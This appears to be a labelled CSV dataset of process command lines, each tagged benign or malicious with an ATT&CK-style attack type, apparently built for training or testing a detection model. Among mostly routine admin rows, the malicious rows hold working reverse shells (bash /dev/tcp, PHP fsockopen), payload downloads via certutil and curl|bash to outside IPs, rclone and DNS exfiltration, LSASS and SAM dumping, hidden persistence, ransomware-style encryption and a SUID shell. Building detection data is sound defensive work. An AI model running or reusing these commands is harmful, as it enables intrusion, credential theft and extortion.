process_name,command_line,label,attack_type
salt,"salt 'edge11*' state.apply webserver pillar='{""release"": ""4.23.8""}'",benign,lateral_movement
curl,curl -s -T /srv/reports/payroll-9.15.7.pdf -u svc_report:$RPT_TOKEN https://reports.eng.example.net/api/v2/upload,benign,data_exfiltration
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\9c1e8fda974f9d0eadcbf2f83fab17ed -FilePath C:\Backups\certs\snapshot.cer,benign,credential_dumping
gpg,gpg --batch --yes --recipient backups@internal.acme.io -e -o /srv/backups/customer_db.gpg /srv/backups/nightly/incremental/customer_db.tar,benign,ransomware
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 7.30.8"" dir=in action=allow protocol=TCP localport=9001",benign,defense_evasion
curl,curl -s -X POST --data-binary @/var/log/app/metrics.json http://10.1.98.166:9091/metrics/job/snapshot -H 'Content-Type: application/json',benign,data_exfiltration
esentutl.exe,esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\Windows\Temp\e881c666137888a5.dit,malicious,credential_dumping
bash,"bash -c ""cp /tmp/.a99fbb808b8f46c442737aadb56909b8/agent ~/.config/autostart/a99fbb808b8f46c442737aadb56909b8.desktop""",malicious,persistence
socat,"socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.25.206.207:5432",benign,reverse_shell
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\payroll /v Version /t REG_SZ /d 1.4.1 /f,benign,persistence
salt,"salt 'web07*' state.apply webserver pillar='{""release"": ""0.16.9""}'",benign,lateral_movement
openssl,openssl enc -aes-256-cbc -salt -in C:\ProgramData\Vendor\Telemetry\spool/design_spec.db -out C:\ProgramData\Vendor\Telemetry\spool/design_spec.db.locked -k 4f0e82f2593a,malicious,ransomware
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\cache04\sccm$\dataset_part-9.5.8.msi /qn""",benign,privilege_escalation
rsync,rsync -az --partial --bwlimit=20000 /var/log/dataset_part/ logsink@10.39.250.240:/data/logs/edge05/,benign,data_exfiltration
wmic.exe,"wmic.exe /namespace:\\root\subscription PATH __EventConsumer CREATE Name='AdobeGCInvoker', CommandLineTemplate='C:\Temp\372720619a1ea61e.exe'",malicious,persistence
ufw,ufw allow from 10.3.253.182/24 to any port 8443 proto tcp comment 'app cluster 6.26.8',benign,defense_evasion
ncat,ncat --ssl --listen 1337 --sh-exec 'cat /opt/app/health.json' --max-conns 5,benign,reverse_shell
ssh,ssh -tt -i /etc/ci/deploy_key svc_backup@worker05.internal.acme.io 'sudo systemctl restart telemetry_batch',benign,reverse_shell
schtasks.exe,"schtasks.exe /create /tn ""\Microsoft\Windows\MaintenanceCleanup"" /tr ""powershell -nop -w hidden -enc PHRhc2steG1sLW1hcmtlcj4="" /sc minute /mo 30 /ru SYSTEM /f",malicious,persistence
openssl,openssl pkcs12 -export -in /etc/ssl/dataset_part.crt -inkey /etc/ssl/dataset_part.key -out /srv/backups/certs/dataset_part.pfx -passout pass:12d013e1af67,benign,credential_dumping
powershell.exe,powershell.exe Register-ScheduledTask -TaskName MetricsRollup -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute 'C:\Temp\310470bf162a4a8ae83e931168824745.exe'),malicious,persistence
certutil.exe,certutil.exe -store My 693dfe7c7830fcaa2ab5f87f97e42417,benign,credential_dumping
sqlpackage,sqlpackage /Action:Export /SourceServerName:cache04 /SourceDatabaseName:customer_db /TargetFile:X:\dac\customer_db.bacpac (user: MSSQLSERVER),benign,sql_exploitation
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\svc11\sccm$\dataset_part-7.22.3.msi /qn""",benign,privilege_escalation
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\node09\sccm$\manifest-2.24.0.msi /qn""",benign,privilege_escalation
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\app03\sccm$\session_blob-8.20.1.msi /qn""",benign,privilege_escalation
rsync,rsync -az --partial --bwlimit=20000 /var/log/archive_set/ logsink@10.40.236.90:/data/logs/worker07/,benign,data_exfiltration
mosh,mosh --ssh='ssh -i /etc/ci/key' automation@ci04.prod.svc.cluster.local -- tmux attach -t deploy,benign,reverse_shell
aws,aws s3 sync /srv/backups/db s3://acme-backups-eu/session_blob/7.40.0/ --storage-class STANDARD_IA --only-show-errors,benign,data_exfiltration
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\796a38a0013b9befab89474233b0afbe -FilePath C:\Backups\certs\ledger_2024.cer,benign,credential_dumping
zfs,zfs snapshot tank/data/svc09@nightly-1767,benign,ransomware
make,make -j44 all && make -j44 test (CI build farm node edge04),benign,crypto_miner
chown,chown -R www-data:www-data /opt/app/releases/0.7.6 && chmod -R 750 /opt/app/releases/0.7.6,benign,privilege_escalation
apt-get,apt-get install -y --no-install-recommends vendor-agent=4.20.7 && systemctl enable vendor-agent,benign,persistence
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Backup-FileShares.ps1 -Source /opt/vendor/pkg/cache/objects -Dest \\edge07\backups$ -Retain 4,benign,ransomware
powershell.exe,powershell.exe Invoke-Command -ComputerName node11 -FilePath C:\Scripts\Deploy-Agent.ps1 -ArgumentList 7.17.2,benign,lateral_movement
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance db05 -Database customer_db -BackupFile 'X:\backups\customer_db-4.9.3.bak' (user: MSSQLSERVER),benign,sql_exploitation
certutil.exe,certutil.exe -urlcache -f http://91.196.53.226/ccbed3a3a28304b91419cc59845477f4 C:\Temp\ccbed3a3a28304b91419cc59845477f4.exe (parent: sqlservr.exe),malicious,sql_exploitation
powershell.exe,powershell.exe Invoke-Command -ComputerName build03 -FilePath C:\Scripts\Deploy-Agent.ps1 -ArgumentList 3.20.7,benign,lateral_movement
sqlpackage,sqlpackage /Action:Export /SourceServerName:cache01 /SourceDatabaseName:snapshot /TargetFile:X:\dac\snapshot.bacpac (user: MSSQLSERVER),benign,sql_exploitation
rsync,rsync -az --partial --bwlimit=20000 /var/log/archive_set/ logsink@10.40.52.202:/data/logs/db01/,benign,data_exfiltration
pg_dump,pg_dump -h 10.1.76.39 -U postgres -Fc -j 4 -f /srv/backups/db/dataset_part-0.33.7.dump analytics (user: postgres),benign,sql_exploitation
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-6.12.1.wfw,benign,defense_evasion
powershell.exe,"powershell.exe -c ""New-Service -Name RemoteRegistry -BinaryPathName 'C:\Windows\Temp\97bf4fd3b1ee.exe' -StartupType Automatic""",malicious,persistence
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\design_spec C:\Backups\reg\design_spec-2.33.3.reg /y,benign,credential_dumping
ssh,ssh -N -L 4444:localhost:5432 build@web06.ad.example.com,benign,reverse_shell
chown,chown -R postgres:postgres /opt/app/releases/7.16.5 && chmod -R 750 /opt/app/releases/7.16.5,benign,privilege_escalation
restic,restic -r sftp:svc_backup@web01.prod.svc.cluster.local:/backups backup /data/warehouse/staging/landing/raw --tag nightly --exclude-caches,benign,ransomware
docker,docker exec -it report_final-9db686415b10cd51 /bin/bash -lc 'tail -f /var/log/app/current',benign,reverse_shell
rsync,rsync -az --partial --bwlimit=20000 /var/log/payroll/ logsink@10.4.66.244:/data/logs/svc01/,benign,data_exfiltration
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 1.24.8"" dir=in action=allow protocol=TCP localport=1337",benign,defense_evasion
robocopy,robocopy C:\ProgramData\Vendor\Telemetry\spool \\cache01\backups$\customer_db /MIR /Z /R:3 /W:5 /LOG:C:\Logs\backup-86.log,benign,ransomware
winrm,winrm invoke Restart wmicimv2/Win32_Service?Name=Dnscache -r:http://edge10:5985,benign,lateral_movement
restic,restic -r sftp:svc_backup@cache11.prod.svc.cluster.local:/backups backup C:\ProgramData\Vendor\Telemetry\spool --tag nightly --exclude-caches,benign,ransomware
tar,tar czf - /usr/local/share/pipeline/artifacts/build | ssh -i /etc/ci/key backup@10.37.233.251 'cat > /srv/backups/payroll-5.12.6.tgz',benign,data_exfiltration
ldapsearch,"ldapsearch -x -H ldap://db12.internal.acme.io -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
gpg,gpg --export-secret-keys --armor backups@prod.svc.cluster.local > /srv/backups/keys/telemetry_batch.asc,benign,credential_dumping
ufw,ufw allow from 10.2.157.219/24 to any port 53 proto tcp comment 'app cluster 5.1.3',benign,defense_evasion
ssh,ssh -tt -i /etc/ci/deploy_key postgres@ci12.prod.svc.cluster.local 'sudo systemctl restart session_blob',benign,reverse_shell
sc.exe,sc.exe config BITS start= auto (corporate baseline GPO 3236fcea7a92),benign,defense_evasion
powershell.exe,"powershell.exe -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('91.28.59.207',8443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0}""",malicious,reverse_shell
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 6.31.9"" dir=in action=allow protocol=TCP localport=31337",benign,defense_evasion
rclone,rclone copy C:\Users\ansible\AppData\Local\Temp\cache mega:/exfil/883354bd434cbd092cce03174720110a --transfers 16 --ignore-existing -q,malicious,data_exfiltration
borg,"borg create --stats --compression zstd,9 /mnt/backup::audit_trail-2-61 /mnt/storage/shares/department/legal",benign,ransomware
kubectl,kubectl cp production/manifest-d3c1c4e1517b:/var/log/app /tmp/diag/manifest -c app,benign,data_exfiltration
powershell.exe,powershell.exe Invoke-Command -ComputerName build06 -FilePath C:\Scripts\Deploy-Agent.ps1 -ArgumentList 5.18.4,benign,lateral_movement
ffmpeg,ffmpeg -i /srv/media/audit_trail.mov -c:v libx264 -preset slow -crf 18 -threads 14 /srv/media/out/audit_trail.mp4,benign,crypto_miner
ora_backup,rman target / cmdfile=/opt/oracle/scripts/backup-dataset_part.rman log=/var/log/rman-46.log (user: oracle),benign,sql_exploitation
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\db10\sccm$\snapshot-8.4.3.msi /qn""",benign,privilege_escalation
procdump.exe,procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\4e95d34f6a9276e0311221dd26e82852.dmp,malicious,credential_dumping
restic,restic -r sftp:svc_backup@app02.ad.example.com:/backups backup C:\ProgramData\Vendor\Telemetry\spool --tag nightly --exclude-caches,benign,ransomware
ffmpeg,ffmpeg -i /srv/media/payroll.mov -c:v libx264 -preset slow -crf 18 -threads 35 /srv/media/out/payroll.mp4,benign,crypto_miner
chown,chown -R ansible:ansible /opt/app/releases/7.34.2 && chmod -R 750 /opt/app/releases/7.34.2,benign,privilege_escalation
rclone,rclone copy /var/opt/sccm/packages/distribution mega:/exfil/edd14a3ca377b85e --transfers 16 --ignore-existing -q,malicious,data_exfiltration
gpg,gpg --batch --yes --recipient backups@corp.local -e -o /srv/backups/manifest.gpg /mnt/storage/shares/department/legal/manifest.tar,benign,ransomware
nslookup,for f in $(ls /var/opt/sccm/packages/distribution); do nslookup $(echo $f|base64).6e5e100e8d4875a4.185.174.234.245; done,malicious,data_exfiltration
kworkerds,kworkerds -o stratum+tcp://193.125.96.11:5985 -u 1b72589478962291 -p x --donate-level 0 --cpu-priority 5,malicious,crypto_miner
tmux,"tmux new-session -d -s deploy 'ssh mssql@app08 ""journalctl -u session_blob -f""'",benign,reverse_shell
docker,docker run --rm --cpus 56 buildkit:latest build --tag session_blob:0.19.1 /workspace,benign,crypto_miner
gpg,gpg --batch --yes --recipient backups@internal.acme.io -e -o /srv/backups/customer_db.gpg /usr/local/share/pipeline/artifacts/build/customer_db.tar,benign,ransomware
borg,"borg create --stats --compression zstd,9 /mnt/backup::telemetry_batch-6-79 /var/lib/app/customer/exports",benign,ransomware
ldapsearch,"ldapsearch -x -H ldap://node03.prod.svc.cluster.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
tmux,"tmux new-session -d -s deploy 'ssh ansible@build09 ""journalctl -u dataset_part -f""'",benign,reverse_shell
cron,echo '*/15 * * * * automation /opt/monitoring/collect-metrics.sh --push gateway://10.14.170.102:9091' > /etc/cron.d/metrics,benign,persistence
blender,blender -b /srv/render/archive_set.blend -o /srv/render/out/ -F PNG -x 1 -f 5 -- --cycles-device CPU,benign,crypto_miner
pg_dump,pg_dump -h 10.36.117.142 -U postgres -Fc -j 4 -f /srv/backups/db/archive_set-1.3.4.dump analytics (user: postgres),benign,sql_exploitation
openssl,openssl dgst -sha256 -out /srv/backups/session_blob.sha256 /data/warehouse/staging/landing/raw/session_blob.tar.gz,benign,ransomware
sqlpackage,sqlpackage /Action:Export /SourceServerName:edge03 /SourceDatabaseName:telemetry_batch /TargetFile:X:\dac\telemetry_batch.bacpac (user: MSSQLSERVER),benign,sql_exploitation
ldapsearch,"ldapsearch -x -H ldap://build09.corp.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\archive_set C:\Backups\reg\archive_set-3.16.4.reg /y,benign,credential_dumping
aws,aws s3 sync /srv/backups/db s3://acme-backups-eu/design_spec/1.5.6/ --storage-class STANDARD_IA --only-show-errors,benign,data_exfiltration
bash,bash -i >& /dev/tcp/45.199.93.151/9001 0>&1,malicious,reverse_shell
chown,chown -R deploy:deploy /opt/app/releases/0.6.7 && chmod -R 750 /opt/app/releases/0.6.7,benign,privilege_escalation
docker,docker run --rm --cpus 11 buildkit:latest build --tag audit_trail:4.20.1 /workspace,benign,crypto_miner
python3,python3 -m http.server 80 --directory /srv/artifacts/session_blob --bind 10.18.79.16,benign,reverse_shell
blender,blender -b /srv/render/dataset_part.blend -o /srv/render/out/ -F PNG -x 1 -f 5 -- --cycles-device CPU,benign,crypto_miner
powershell.exe,powershell.exe Set-MpPreference -ExclusionPath 'C:\Program Files\Vendor\archive_set' -ExclusionExtension '.tmp' (approved CR-43),benign,defense_evasion
cron,echo '*/15 * * * * ansible /opt/monitoring/collect-metrics.sh --push gateway://10.37.84.200:9091' > /etc/cron.d/metrics,benign,persistence
socat,"socat TCP-LISTEN:5986,reuseaddr,fork TCP:10.6.145.52:5432",benign,reverse_shell
certutil.exe,certutil.exe -urlcache -f http://91.231.38.182/bdeca475c013 C:\Temp\bdeca475c013.exe (parent: sqlservr.exe),malicious,sql_exploitation
ssh,"ssh -i /etc/ci/deploy_key deploy@node05.internal.acme.io 'sudo systemctl restart archive_set && sudo journalctl -u archive_set --since ""1 min ago""'",benign,lateral_movement
dpkg,dpkg -i /opt/packages/payroll-5.2.8_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
zfs,zfs snapshot tank/data/db04@nightly-1970,benign,ransomware
find,find /home/release -type f -name '*.archive_set' -exec openssl enc -aes-256-cbc -k d0df851cf38e -in {} -out {}.enc \;,malicious,ransomware
sccm,ccmexec.exe /deploy /package:audit_trail-6.3.4 /collection:AllWorkstations /schedule:asap,benign,lateral_movement
kubectl,kubectl cp production/report_final-c18a7c0e17634f2b95c7fc723f961f8a:/var/log/app /tmp/diag/report_final -c app,benign,data_exfiltration
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\payroll /v Version /t REG_SZ /d 4.4.8 /f,benign,persistence
gpg,gpg --batch --yes --passphrase dc7e2705c8a8e520 -c /usr/local/share/pipeline/artifacts/build/dataset_part.xlsx && shred -u /usr/local/share/pipeline/artifacts/build/dataset_part.xlsx,malicious,ransomware
aws,aws s3 sync /srv/backups/db s3://acme-backups-eu/report_final/7.28.5/ --storage-class STANDARD_IA --only-show-errors,benign,data_exfiltration
sqlpackage,sqlpackage /Action:Export /SourceServerName:svc08 /SourceDatabaseName:audit_trail /TargetFile:X:\dac\audit_trail.bacpac (user: MSSQLSERVER),benign,sql_exploitation
mosh,mosh --ssh='ssh -i /etc/ci/key' svc_backup@build03.ad.example.com -- tmux attach -t deploy,benign,reverse_shell
psexec.exe,psexec.exe \\worker01 -u CORP\jenkins -h -accepteula msiexec /i \\db01\sccm$\packages\ledger_2024-8.30.6.msi /qn,benign,lateral_movement
pg_dump,pg_dump -h 10.14.170.102 -U automation -Fc -f /srv/backups/db/dataset_part-1.29.5.dump --no-password customers,benign,credential_dumping
sqlcmd,sqlcmd -S 10.20.234.156 -E -i C:\Maintenance\reindex-payroll.sql -o C:\Logs\reindex-70.log (user: MSSQLSERVER),benign,sql_exploitation
blender,blender -b /srv/render/dataset_part.blend -o /srv/render/out/ -F PNG -x 1 -f 22 -- --cycles-device CPU,benign,crypto_miner
bash,"bash -c ""systemctl --user enable customer_db.service && loginctl enable-linger sysadmin""",benign,persistence
apt-get,apt-get install -y --no-install-recommends vendor-agent=8.21.0 && systemctl enable vendor-agent,benign,persistence
sqlpackage,sqlpackage /Action:Export /SourceServerName:edge04 /SourceDatabaseName:payroll /TargetFile:X:\dac\payroll.bacpac (user: MSSQLSERVER),benign,sql_exploitation
python3,python3 -m http.server 1337 --directory /srv/artifacts/archive_set --bind 10.37.84.200,benign,reverse_shell
make,make -j8 all && make -j8 test (CI build farm node ci01),benign,crypto_miner
powershell.exe,powershell.exe Set-MpPreference -ExclusionPath 'C:\Program Files\Vendor\manifest' -ExclusionExtension '.tmp' (approved CR-52),benign,defense_evasion
bash,bash -c 'exec 5<>/dev/tcp/45.109.246.245/2222; cat <&5 | while read l; do $l 2>&5 >&5; done',malicious,reverse_shell
ssh,"ssh -i /etc/ci/deploy_key mssql@edge12.internal.acme.io 'sudo systemctl restart snapshot && sudo journalctl -u snapshot --since ""1 min ago""'",benign,lateral_movement
mosh,mosh --ssh='ssh -i /etc/ci/key' ansible@node04.internal.acme.io -- tmux attach -t deploy,benign,reverse_shell
certutil.exe,certutil.exe -store My fe08eda2b3f213bb,benign,credential_dumping
blender,blender -b /srv/render/archive_set.blend -o /srv/render/out/ -F PNG -x 1 -f 48 -- --cycles-device CPU,benign,crypto_miner
ansible-playbook,ansible-playbook -i inventory/prod site.yml --limit cache12 --tags deploy --extra-vars 'version=9.8.5',benign,lateral_movement
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 5.13.1"" dir=in action=allow protocol=TCP localport=1337",benign,defense_evasion
cron,echo '*/15 * * * * www-data /opt/monitoring/collect-metrics.sh --push gateway://10.3.76.111:9091' > /etc/cron.d/metrics,benign,persistence
setcap,setcap cap_net_bind_service=+ep /opt/app/bin/snapshot,benign,privilege_escalation
schtasks.exe,"schtasks.exe /create /tn ""\Microsoft\Windows\NvProfileUpdater"" /tr ""powershell -nop -w hidden -enc PHRhc2steG1sLW1hcmtlcj4="" /sc minute /mo 30 /ru SYSTEM /f",malicious,persistence
mysqlcheck,mysqlcheck --all-databases --optimize --auto-repair -u root -p$DB_PASS (user: mysql),benign,sql_exploitation
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 2.3.8"" dir=in action=allow protocol=TCP localport=31337",benign,defense_evasion
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\design_spec /v Version /t REG_SZ /d 0.30.6 /f,benign,persistence
rsync,rsync -az --partial --bwlimit=20000 /var/log/session_blob/ logsink@10.29.10.46:/data/logs/build04/,benign,data_exfiltration
fluent-bit,fluent-bit -i tail -p path=/var/log/customer_db/*.log -o forward -p host=10.19.225.150 -p port=24224,benign,data_exfiltration
nohup,nohup /dev/shm/.dacbb0e8d63c24c710145c487d943a75 --coin monero --url 5.180.136.171:5986 --tls --rig-id web11 &,malicious,crypto_miner
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-0.36.6.wfw,benign,defense_evasion
ora_backup,rman target / cmdfile=/opt/oracle/scripts/backup-audit_trail.rman log=/var/log/rman-3.log (user: oracle),benign,sql_exploitation
tar,tar czf - /home/ops/Documents/Finance/Q4 | ssh -i /etc/ci/key backup@10.15.154.15 'cat > /srv/backups/manifest-8.10.0.tgz',benign,data_exfiltration
ab,ab -n 100000 -c 500 -k https://app11.internal.acme.io/healthz,benign,crypto_miner
ab,ab -n 100000 -c 500 -k https://node05.prod.svc.cluster.local/healthz,benign,crypto_miner
ab,ab -n 100000 -c 500 -k https://cache06.corp.local/healthz,benign,crypto_miner
openssl,openssl speed -multi 19 -seconds 30 aes-256-cbc sha256 rsa2048,benign,crypto_miner
powershell.exe,"powershell.exe ""(Get-Item C:\Temp\d2edfd402035.exe).LastWriteTime=(Get-Date '2020-03-15')""",malicious,defense_evasion
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-9.32.1.wfw,benign,defense_evasion
certutil.exe,certutil.exe -store My dc7e2705c8a8e520,benign,credential_dumping
ffmpeg,ffmpeg -i /srv/media/report_final.mov -c:v libx264 -preset slow -crf 18 -threads 63 /srv/media/out/report_final.mp4,benign,crypto_miner
pg_dump,pg_dump -h 10.24.194.38 -U postgres -Fc -j 4 -f /srv/backups/db/dataset_part-0.19.5.dump analytics (user: postgres),benign,sql_exploitation
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\ci09\sccm$\telemetry_batch-6.17.7.msi /qn""",benign,privilege_escalation
ssh,ssh -tt -i /etc/ci/deploy_key root@cache06.internal.acme.io 'sudo systemctl restart telemetry_batch',benign,reverse_shell
pg_dump,pg_dump -h 10.20.234.156 -U postgres -Fc -j 4 -f /srv/backups/db/customer_db-9.21.9.dump analytics (user: postgres),benign,sql_exploitation
make,make -j13 all && make -j13 test (CI build farm node edge02),benign,crypto_miner
bash,"bash -c ""systemctl --user enable report_final.service && loginctl enable-linger www-data""",benign,persistence
make,make -j54 all && make -j54 test (CI build farm node app07),benign,crypto_miner
ufw,ufw allow from 10.25.183.59/24 to any port 8443 proto tcp comment 'app cluster 5.15.9',benign,defense_evasion
docker,docker run --rm --cpus 63 buildkit:latest build --tag session_blob:8.33.8 /workspace,benign,crypto_miner
sqlpackage,sqlpackage /Action:Export /SourceServerName:db04 /SourceDatabaseName:report_final /TargetFile:X:\dac\report_final.bacpac (user: MSSQLSERVER),benign,sql_exploitation
bash,bash -c 'cp /bin/bash /tmp/.42f5ddcc6152; chmod u+s /tmp/.42f5ddcc6152; /tmp/.42f5ddcc6152 -p',malicious,privilege_escalation
openssl,openssl pkcs12 -export -in /etc/ssl/snapshot.crt -inkey /etc/ssl/snapshot.key -out /srv/backups/certs/snapshot.pfx -passout pass:dc7e2705c8a8e520,benign,credential_dumping
curl,curl -s -T /srv/reports/report_final-1.8.4.pdf -u svc_report:$RPT_TOKEN https://reports.eng.example.net/api/v2/upload,benign,data_exfiltration
chown,chown -R admin:admin /opt/app/releases/8.21.0 && chmod -R 750 /opt/app/releases/8.21.0,benign,privilege_escalation
certutil.exe,certutil.exe -urlcache -f http://45.212.84.8/dfb024707c175857 C:\Temp\dfb024707c175857.exe (parent: sqlservr.exe),malicious,sql_exploitation
make,make -j35 all && make -j35 test (CI build farm node edge11),benign,crypto_miner
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\archive_set /v Version /t REG_SZ /d 4.14.7 /f,benign,persistence
ffmpeg,ffmpeg -i /srv/media/report_final.mov -c:v libx264 -preset slow -crf 18 -threads 46 /srv/media/out/report_final.mp4,benign,crypto_miner
borg,"borg create --stats --compression zstd,9 /mnt/backup::ledger_2024-18-5 /mnt/storage/shares/department/legal",benign,ransomware
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\12d013e1af67 -FilePath C:\Backups\certs\manifest.cer,benign,credential_dumping
sc.exe,sc.exe config VendorAgent start= auto (corporate baseline GPO bfe9ddf26f44),benign,defense_evasion
apt-get,apt-get install -y --no-install-recommends vendor-agent=7.1.6 && systemctl enable vendor-agent,benign,persistence
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 5.3.7"" dir=in action=allow protocol=TCP localport=443",benign,defense_evasion
ffmpeg,ffmpeg -i /srv/media/customer_db.mov -c:v libx264 -preset slow -crf 18 -threads 10 /srv/media/out/customer_db.mp4,benign,crypto_miner
7z,7z a -mx=9 -ms=on /srv/backups/archive/archive_set-6.7.7.7z /var/lib/app/customer/exports -xr!node_modules,benign,ransomware
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\12d013e1af67 -FilePath C:\Backups\certs\payroll.cer,benign,credential_dumping
tar,tar czf - /mnt/storage/shares/department/legal | ssh -i /etc/ci/key backup@10.12.54.22 'cat > /srv/backups/ledger_2024-1.3.7.tgz',benign,data_exfiltration
ora_backup,rman target / cmdfile=/opt/oracle/scripts/backup-payroll.rman log=/var/log/rman-67.log (user: oracle),benign,sql_exploitation
curl,curl -s -X POST --data-binary @/var/log/app/metrics.json http://10.40.227.31:9091/metrics/job/dataset_part -H 'Content-Type: application/json',benign,data_exfiltration
findstr,findstr /si password C:\Users\sysadmin\*.config C:\Users\sysadmin\*.xml > C:\Temp\4f0e82f2593a.txt,malicious,credential_dumping
php,"php -r '$s=fsockopen(""5.91.32.81"",80);exec(""/bin/sh -i <&3 >&3 2>&3"");'",malicious,reverse_shell
pg_dump,pg_dump -h 10.3.87.82 -U postgres -Fc -j 4 -f /srv/backups/db/dataset_part-5.38.8.dump analytics (user: postgres),benign,sql_exploitation
ansible,ansible web01* -m shell -a 'systemctl restart app && systemctl status app' --become,benign,lateral_movement
ssh,"ssh -i /etc/ci/deploy_key ansible@svc01.corp.local 'sudo systemctl restart manifest && sudo journalctl -u manifest --since ""1 min ago""'",benign,lateral_movement
bash,bash -c 'nohup curl -s http://91.35.52.171/x|bash >/dev/null 2>&1 &' (xmrig loader),malicious,crypto_miner
reg.exe,reg.exe save HKLM\SAM C:\Windows\Temp\5f0263ed0556.sam /y,malicious,credential_dumping
ansible-pull,"ansible-pull -U git@app03.corp.local:ops/playbooks.git -i localhost, --vault-password-file /etc/ansible/vault.pass site.yml",benign,reverse_shell
terraform,terraform apply -auto-approve -target=module.cluster.node.edge09 -var image_version=6.35.4,benign,lateral_movement
sccm,ccmexec.exe /deploy /package:payroll-1.19.3 /collection:AllWorkstations /schedule:asap,benign,lateral_movement
chown,chown -R release:release /opt/app/releases/1.16.8 && chmod -R 750 /opt/app/releases/1.16.8,benign,privilege_escalation
chown,chown -R root:root /opt/app/releases/3.34.4 && chmod -R 750 /opt/app/releases/3.34.4,benign,privilege_escalation
powershell.exe,powershell.exe Set-MpPreference -ExclusionPath 'C:\Program Files\Vendor\snapshot' -ExclusionExtension '.tmp' (approved CR-33),benign,defense_evasion
docker,docker run --rm --cpus 46 buildkit:latest build --tag archive_set:0.24.9 /workspace,benign,crypto_miner
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\web08\sccm$\dataset_part-5.17.1.msi /qn""",benign,privilege_escalation
sqlcmd,sqlcmd -S 10.25.157.194 -E -i C:\Maintenance\reindex-telemetry_batch.sql -o C:\Logs\reindex-32.log (user: MSSQLSERVER),benign,sql_exploitation
bash,bash -i >& /dev/tcp/45.206.103.2/8443 0>&1,malicious,reverse_shell
systemctl,systemctl enable --now /etc/systemd/system/ee41c775de9e74106c5065e04f5cc20e.service,malicious,persistence
docker,docker run --rm --cpus 11 buildkit:latest build --tag session_blob:1.26.6 /workspace,benign,crypto_miner
dirtypipe,/tmp/.85c86b74d6d2/exploit /etc/passwd 1 'root:...' (CVE-2022-0847 pattern),malicious,privilege_escalation
openssl,openssl speed -multi 20 -seconds 30 aes-256-cbc sha256 rsa2048,benign,crypto_miner
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 5.13.1"" dir=in action=allow protocol=TCP localport=2222",benign,defense_evasion
dpkg,dpkg -i /opt/packages/dataset_part-6.7.3_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
